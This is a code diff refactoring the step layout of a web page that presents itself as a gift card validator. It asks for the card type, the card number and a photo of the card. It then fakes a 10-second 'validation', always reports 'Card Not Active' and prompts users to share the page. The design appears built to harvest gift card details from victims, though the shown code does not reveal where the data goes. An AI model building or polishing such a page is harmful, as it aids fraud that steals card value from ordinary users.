@@ -125,21 +125,27 @@
         
         .content {
             padding: 40px;
+            position: relative;
+            min-height: 500px;
         }
         
-        /* Auto-transitioning steps */
-        .step {
-            display: none;
-            animation: slideIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        /* Step container - only one visible at a time */
+        .step-container {
+            position: absolute;
+            top: 40px;
+            left: 40px;
+            right: 40px;
+            opacity: 0;
+            transform: translateY(20px);
+            visibility: hidden;
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
         
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(30px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-        
-        .step.active {
-            display: block;
+        .step-container.active {
+            opacity: 1;
+            transform: translateY(0);
+            visibility: visible;
+            position: relative;
         }
         
         /* Fun step headers */
@@ -642,6 +648,11 @@
             padding: 60px 40px;
             display: none;
             animation: slideIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
         }
         
         .result-container.active {
@@ -774,6 +785,11 @@
             to { opacity: 1; }
         }
         
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
         @keyframes bounce {
             0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
             40% {transform: translateY(-20px);}
@@ -802,6 +818,13 @@
             
             .content {
                 padding: 30px 25px;
+                min-height: 450px;
+            }
+            
+            .step-container {
+                top: 30px;
+                left: 25px;
+                right: 25px;
             }
             
             .card-selection-grid {
@@ -884,9 +907,9 @@
             <div class="progress-bar" id="progress-bar"></div>
         </div>
         
-        <!-- Step 1: Select Gift Card Type -->
         <div class="content">
-            <div class="step active" id="step1">
+            <!-- Step 1: Select Gift Card Type -->
+            <div class="step-container active" id="step1">
                 <div class="step-header">
                     <div class="step-number">1</div>
                     <div class="step-title">Pick Your Gift Card</div>
@@ -924,7 +947,7 @@
             </div>
             
             <!-- Step 2: Enter Card Details -->
-            <div class="step" id="step2">
+            <div class="step-container" id="step2">
                 <div class="step-header">
                     <div class="step-number">2</div>
                     <div class="step-title">Enter Card Number</div>
@@ -965,7 +988,7 @@
             </div>
             
             <!-- Step 3: Upload Card Image -->
-            <div class="step" id="step3">
+            <div class="step-container" id="step3">
                 <div class="step-header">
                     <div class="step-number">3</div>
                     <div class="step-title">Upload Card Photo</div>
@@ -1010,37 +1033,37 @@
                     </button>
                 </div>
             </div>
-        </div>
-        
-        <!-- Loading Overlay -->
-        <div class="loading-overlay" id="loading-overlay">
-            <div class="throbber"></div>
-            <div class="loading-text">Validating Your Card</div>
-            <div class="loading-subtext">This usually takes just a moment...</div>
-        </div>
-        
-        <!-- Result Display -->
-        <div class="result-container" id="result">
-            <div class="result-icon">
-                <i class="fas fa-times-circle"></i>
+            
+            <!-- Loading Overlay -->
+            <div class="loading-overlay" id="loading-overlay">
+                <div class="throbber"></div>
+                <div class="loading-text">Validating Your Card</div>
+                <div class="loading-subtext">This usually takes just a moment...</div>
             </div>
-            <h2 class="result-title">Oops! Card Not Active</h2>
-            <p class="result-message" id="result-message">This gift card couldn't be validated. It might be inactive, expired, or already used.</p>
-            <p class="result-note">Need help? Contact the store or person who gave you this gift card.</p>
             
-            <button class="btn btn-share" id="share-trigger">
-                <i class="fas fa-share-alt"></i> SHARE RESULT
-            </button>
-            
-            <div class="share-options" id="share-options" style="display: none;">
-                <div class="share-btn whatsapp" id="share-whatsapp">
-                    <i class="fab fa-whatsapp"></i> WhatsApp
+            <!-- Result Display -->
+            <div class="result-container" id="result">
+                <div class="result-icon">
+                    <i class="fas fa-times-circle"></i>
                 </div>
-                <div class="share-btn email" id="share-email">
-                    <i class="fas fa-envelope"></i> Email
-                </div>
-                <div class="share-btn copy" id="share-copy">
-                    <i class="fas fa-copy"></i> Copy Text
+                <h2 class="result-title">Oops! Card Not Active</h2>
+                <p class="result-message" id="result-message">This gift card couldn't be validated. It might be inactive, expired, or already used.</p>
+                <p class="result-note">Need help? Contact the store or person who gave you this gift card.</p>
+                
+                <button class="btn btn-share" id="share-trigger">
+                    <i class="fas fa-share-alt"></i> SHARE RESULT
+                </button>
+                
+                <div class="share-options" id="share-options" style="display: none;">
+                    <div class="share-btn whatsapp" id="share-whatsapp">
+                        <i class="fab fa-whatsapp"></i> WhatsApp
+                    </div>
+                    <div class="share-btn email" id="share-email">
+                        <i class="fas fa-envelope"></i> Email
+                    </div>
+                    <div class="share-btn copy" id="share-copy">
+                        <i class="fas fa-copy"></i> Copy Text
+                    </div>
                 </div>
             </div>
         </div>
@@ -1103,6 +1126,10 @@
         
         // Initialize the application
         function init() {
+            // Initially hide all steps except step 1
+            hideAllSteps();
+            step1.classList.add('active');
+            
             // Populate gift card selection options
             populateGiftCardOptions();
             
@@ -1165,6 +1192,16 @@
             document.getElementById('share-whatsapp').addEventListener('click', shareViaWhatsApp);
             document.getElementById('share-email').addEventListener('click', shareViaEmail);
             document.getElementById('share-copy').addEventListener('click', copyShareLink);
+        }
+        
+        // Hide all step containers
+        function hideAllSteps() {
+            const steps = document.querySelectorAll('.step-container');
+            steps.forEach(step => {
+                step.classList.remove('active');
+            });
+            loadingOverlay.classList.remove('active');
+            result.classList.remove('active');
         }
         
         // Populate gift card selection options
@@ -1262,7 +1299,7 @@
                 return;
             }
             
-            step1.classList.remove('active');
+            hideAllSteps();
             step2.classList.add('active');
             currentStep = 2;
             progressBar.style.width = '66%';
@@ -1275,7 +1312,7 @@
         function goToStep3() {
             if (!validateCardInputs()) return;
             
-            step2.classList.remove('active');
+            hideAllSteps();
             step3.classList.add('active');
             currentStep = 3;
             progressBar.style.width = '100%';
@@ -1283,7 +1320,7 @@
         
         // Navigate back to step 1
         function goToStep1() {
-            step2.classList.remove('active');
+            hideAllSteps();
             step1.classList.add('active');
             currentStep = 1;
             progressBar.style.width = '33%';
@@ -1291,7 +1328,7 @@
         
         // Navigate back to step 2
         function goToStep2() {
-            step3.classList.remove('active');
+            hideAllSteps();
             step2.classList.add('active');
             currentStep = 2;
             progressBar.style.width = '66%';
@@ -1333,10 +1370,8 @@
         // Submit verification
         function submitVerification() {
             // Show loading overlay
+            hideAllSteps();
             loadingOverlay.classList.add('active');
-            
-            // Hide step 3
-            step3.classList.remove('active');
             
             // Update result message with selected card info
             if (selectedCard) {
@@ -1345,10 +1380,8 @@
             
             // Simulate 10-second processing time
             setTimeout(() => {
-                // Hide loading overlay
-                loadingOverlay.classList.remove('active');
-                
-                // Show result
+                // Hide loading overlay and show result
+                hideAllSteps();
                 result.classList.add('active');
             }, 10000);
         }
